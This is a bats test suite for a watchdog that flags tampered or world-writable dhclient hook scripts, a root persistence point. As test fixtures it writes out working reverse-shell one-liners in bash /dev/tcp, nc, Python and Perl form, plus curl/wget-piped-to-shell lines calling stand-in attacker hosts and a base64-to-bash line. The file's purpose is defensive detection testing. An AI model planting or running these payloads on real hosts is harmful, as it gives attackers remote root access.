#!/usr/bin/env bats
# L2 bats functional tests for the dhclient-hooks-watchdog scan script.
#
# dhclient-script SOURCES the hook files AS ROOT on every DHCP lease event
# (BOUND/RENEW/REBIND/…); lease RENEW self-fires on a timer, so a planted
# hook is root-exec-on-network-event persistence (T1546). A hook that is
# world-writable / non-root-owned, or contains a command-injection pattern,
# is alert.
#
# Runs the actual scan script with `logger` shadowed on PATH and the hook
# dir + files in a tmp sandbox via SELFDEF_DHCLIENT_DIRS / _FILES.
#
# Run with: bats packaging/test/L2-dhclient-hooks-watchdog.bats

WD="${BATS_TEST_DIRNAME}/../../modules/dhclient-hooks-watchdog/systemd/dhclient-hooks-watchdog.sh"
LIB="${BATS_TEST_DIRNAME}/../lib/module-lib.sh"

setup() {
    TMP="$(mktemp -d)"
    BIN="${TMP}/bin"; mkdir -p "${BIN}"
    cat > "${BIN}/logger" <<'FAKELOGGER'
#!/usr/bin/env bash
printf '%s\n' "$*" >> "${SELFDEF_TEST_LOGCAP}"
FAKELOGGER
    chmod +x "${BIN}/logger"
    export SELFDEF_TEST_LOGCAP="${TMP}/log.out"
    : > "${SELFDEF_TEST_LOGCAP}"
    BASELINE="${TMP}/baseline.tsv"
    HOOKD="${TMP}/exit-hooks.d"; mkdir -p "${HOOKD}"
}

teardown() { rm -rf "${TMP}"; }

run_wd() {
    PATH="${BIN}:${PATH}" \
    SELFDEF_MODULE_LIB="${LIB}" \
    SELFDEF_DHCLIENT_PROFILE="${PROFILE:-report}" \
    SELFDEF_DHCLIENT_BASELINE="${BASELINE}" \
    SELFDEF_DHCLIENT_DIRS="${DIRS_V:-$HOOKD}" \
    SELFDEF_DHCLIENT_FILES="${TMP}/no-extra-file" \
    bash "${WD}"
}

cap() { cat "${SELFDEF_TEST_LOGCAP}"; }

seed_benign() {
    printf '#!/bin/sh\n# update resolv.conf on lease\necho "dhclient bound"\n' > "${HOOKD}/zzz_benign"
}

# ============================================================
# ok tier
# ============================================================

@test "no dhclient hooks → ok / no_dhclient_hooks" {
    DIRS_V="${TMP}/empty" run_wd
    cap | grep -q '"event":"no_dhclient_hooks"'
    cap | grep -q '"severity":"ok"'
}

@test "benign hook, first run → ok / baseline_initial" {
    seed_benign
    run_wd
    cap | grep -q '"event":"baseline_initial"'
    cap | grep -q '"severity":"ok"'
    [ -f "${BASELINE}" ]
}

@test "unchanged hooks on second run → ok / dhclient_hooks_intact" {
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"event":"dhclient_hooks_intact"'
    cap | grep -q '"severity":"ok"'
}

# ============================================================
# alert tier
# ============================================================

@test "a hook containing an injection pattern → alert / dhclient_hooks_suspicious" {
    seed_benign
    run_wd                                   # benign baseline
    printf '#!/bin/sh\nbash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n' > "${HOOKD}/zzz_benign"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"event":"dhclient_hooks_suspicious"'
    cap | grep -q '"severity":"alert"'
}

@test "a world-writable hook → alert" {
    seed_benign
    run_wd
    chmod 0666 "${HOOKD}/zzz_benign"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

# ============================================================
# warn tier
# ============================================================

@test "a benign hook change → warn / dhclient_hooks_changed" {
    seed_benign
    run_wd
    printf '#!/bin/sh\n# updated benign hook\necho "dhclient renew"\n' > "${HOOKD}/zzz_benign"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -qE '"event":"dhclient_hooks_changed"'
    cap | grep -q '"severity":"warn"'
}

# ============================================================
# false-positive guard
# ============================================================

@test "a benign root-owned hook is NOT flagged" {
    seed_benign
    run_wd
    ! cap | grep -q '"severity":"alert"'
    cap | grep -q '"severity":"ok"'
}

# ============================================================
# fail-loud + enforce profile
# ============================================================

@test "missing module-lib → alert / module_lib_missing + non-zero exit" {
    seed_benign
    LIB="${TMP}/nonexistent-module-lib.sh" run run_wd
    [ "${status}" -ne 0 ]
    cap | grep -q '"event":"module_lib_missing"'
    cap | grep -q '"severity":"alert"'
}

@test "enforce profile exits non-zero on a suspicious hook" {
    seed_benign
    run_wd
    printf '#!/bin/sh\ncurl http://evil/p|sh\n' > "${HOOKD}/zzz_benign"
    : > "${SELFDEF_TEST_LOGCAP}"
    PROFILE=enforce run run_wd
    [ "${status}" -ne 0 ]
    cap | grep -q '"severity":"alert"'
}

@test "baseline is chmod 0600 (confidentiality — dhclient hook inventory enumerates root-exec-on-lease surface)" {
    seed_benign
    run_wd
    [ "$(stat -c '%a' "${BASELINE}")" = "600" ]
}

@test "INVARIANT (reverse-shell pattern): /dev/tcp reverse shell in hook → alert" {
    seed_benign
    run_wd
    printf '#!/bin/sh\nbash -i >& /dev/tcp/1.1.1.1/4444 0>&1\n' > "${HOOKD}/zzz_benign"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (wget-pipe-sh): wget bootstrap variant in hook → alert" {
    seed_benign
    run_wd
    printf '#!/bin/sh\nwget -qO- http://attacker/p | sh\n' > "${HOOKD}/zzz_benign"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (base64-decode-pipe): obfuscation variant in hook → alert" {
    seed_benign
    run_wd
    printf '#!/bin/sh\necho YmFzaCAtaQ== | base64 -d | bash\n' > "${HOOKD}/zzz_benign"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (group-writable hook): group-writable → alert above world-writable bar" {
    seed_benign
    run_wd
    chmod 0664 "${HOOKD}/zzz_benign"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (pre-existing world-writable hook): baseline_initial fires alert at install-time" {
    seed_benign
    chmod 0666 "${HOOKD}/zzz_benign"
    run_wd
    cap | grep -q '"event":"baseline_initial"'
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "DELTA detect — ADDED hook (attacker drops a new exit-hooks.d hook) surfaces in sample" {
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '#!/bin/sh\necho "new"\n' > "${HOOKD}/distinctive-attacker-hook"
    run_wd
    cap | grep -q 'distinctive-attacker-hook'
}

@test "JSON record is emitted as a SINGLE main logger line (downstream JSON-line consumer contract)" {
    seed_benign
    run_wd
    main_count=$(cap | grep -cE '^-t selfdef-dhclient-hooks -- ')
    [ "${main_count}" = "1" ]
}

@test "INVARIANT (no auto-trust): dhclient-hooks-watchdog does NOT refresh baseline on injection detection — alert STAYS until operator updates" {
    # T1546 lease-event-triggered root exec persistence — injection
    # alert MUST persist across runs until operator explicitly re-baselines.
    seed_benign
    run_wd
    printf '#!/bin/sh\nbash -i >& /dev/tcp/1.1.1.1/4444 0>&1\n' > "${HOOKD}/zzz_benign"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd                                              # first delta — alert
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd                                              # alert STAYS
    cap | grep -q '"event":"dhclient_hooks_suspicious"'
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (commented injection pattern NOT flagged: # prefix filtered)" {
    # dhclient hook scripts are /bin/sh; # comments. Operator notes
    # about hypothetical attack patterns must NOT trigger alert.
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '#!/bin/sh\n# update resolv.conf on lease\n# example attack: bash -i >& /dev/tcp/evil.com/4444 0>&1\necho "dhclient bound"\n' > "${HOOKD}/zzz_benign"
    run_wd
    ! cap | grep -q '"event":"dhclient_hooks_suspicious"'
    ! cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (multi-dir + extra-file scan: dhclient hook in either dir + extra-file axes — injection in ANY → alert)" {
    # dhclient sources from /etc/dhcp/dhclient-{enter,exit}-hooks.d/
    # AND extra config files. Lock multi-source axis.
    HOOKD2="${TMP}/enter-hooks.d"; mkdir -p "${HOOKD2}"
    EXTRAFILE="${TMP}/dhclient-extra-hook"
    seed_benign
    PATH="${BIN}:${PATH}" \
    SELFDEF_MODULE_LIB="${LIB}" \
    SELFDEF_DHCLIENT_PROFILE="report" \
    SELFDEF_DHCLIENT_BASELINE="${BASELINE}" \
    SELFDEF_DHCLIENT_DIRS="${HOOKD} ${HOOKD2}" \
    SELFDEF_DHCLIENT_FILES="${EXTRAFILE}" \
    bash "${WD}"
    : > "${SELFDEF_TEST_LOGCAP}"
    # Plant injection in second dir.
    printf '#!/bin/sh\nbash -i >& /dev/tcp/1.1.1.1/4444 0>&1\n' > "${HOOKD2}/evil-hook"
    PATH="${BIN}:${PATH}" \
    SELFDEF_MODULE_LIB="${LIB}" \
    SELFDEF_DHCLIENT_PROFILE="report" \
    SELFDEF_DHCLIENT_BASELINE="${BASELINE}" \
    SELFDEF_DHCLIENT_DIRS="${HOOKD} ${HOOKD2}" \
    SELFDEF_DHCLIENT_FILES="${EXTRAFILE}" \
    bash "${WD}"
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (curl-pipe-bash variant — bash subshell — also detected)" {
    # curl | bash is a common bootstrap variant. Lock detection of
    # the bash suffix in addition to sh.
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '#!/bin/sh\ncurl -s http://attacker.com/p | bash\n' > "${HOOKD}/zzz_benign"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (nc reverse-shell variant in dhclient hook: netcat-listening pipe also detected)" {
    # Sister to sshrc/csh-config/logrotate/systemd-power-hooks nc
    # reverse-shell variant INVARIANTs. Lock the netcat axis on the
    # DHCP-lease-event root-exec surface too.
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '#!/bin/sh\nnc -e /bin/sh 1.1.1.1 4444\n' > "${HOOKD}/zzz_benign"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (DELTA detect — ADDED hook surfaces in sample with distinctive name — operator-triage routing)" {
    # Sister to many other watchdog DELTA-detect sample-naming
    # INVARIANTs across the brain. When an attacker drops a new
    # dhclient hook (rather than modifying an existing one), the
    # added hook MUST surface in the JSON sample so operator
    # dashboard routes triage to the right path. Locks the new-
    # file-discovered operator-visibility contract on the DHCP-
    # lease-event root-exec surface.
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '#!/bin/sh\necho "new"\n' > "${HOOKD}/distinctive-attacker-dhclient-hook"
    run_wd
    cap | grep -q 'distinctive-attacker-dhclient-hook'
}

@test "INVARIANT (python -c reverse-shell variant — interpreter-rev-shell axis on dhclient hook surface)" {
    # Sister to many other watchdog's python interpreter-rev-shell
    # INVARIANTs across the brain. Beyond bash/sh/nc, attackers
    # reach for python -c 'import socket,os,pty' to dodge shell-
    # pattern detectors. Locks the python axis on the DHCP-lease-
    # event-trigger root-exec persistence surface (T1546 —
    # dhclient hooks run AS ROOT on every DHCP lease event /
    # renewal / interface bring-up).
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '#!/bin/sh\npython -c "import socket,os,pty;s=socket.socket();s.connect((\\"1.1.1.1\\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);pty.spawn(\\"/bin/sh\\")"\n' > "${HOOKD}/test-hook"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (perl -e reverse-shell variant — perl-interpreter-rev-shell axis on dhclient hook surface)" {
    # Sister to nc / python -c / curl|bash / dev-tcp dhclient-hook
    # rev-shell variants already locked. Perl is on every Debian/
    # Ubuntu host as dpkg/locale dependency; 'use Socket' produces
    # a one-liner connect-back PTY just as cleanly as Python. Locks
    # the perl axis on the T1546 DHCP-lease-event-trigger root-exec
    # persistence surface — dhclient hooks fire AS ROOT on every
    # lease event (renew/release/bring-up); a planted perl rev-
    # shell fires every renewal cycle until detected.
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '#!/bin/sh\nperl -e "use Socket;\\$i=\\"1.1.1.1\\";\\$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\\"tcp\\"));connect(S,sockaddr_in(\\$p,inet_aton(\\$i)));exec(\\"/bin/sh -i\\");"\n' > "${HOOKD}/test-hook"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (single MAIN logger record per scan — SDD-062 consumer dispatch contract)" {
    # Sister to brain-wide single-MAIN-logger-line INVARIANTs.
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '#!/bin/sh\nbash -i >& /dev/tcp/1.1.1.1/4444 0>&1\n' > "${HOOKD}/test-hook"
    run_wd
    main_count=$(cap | grep -cE '^-t selfdef-dhclient-hooks -- ')
    [ "${main_count}" = "1" ]
}
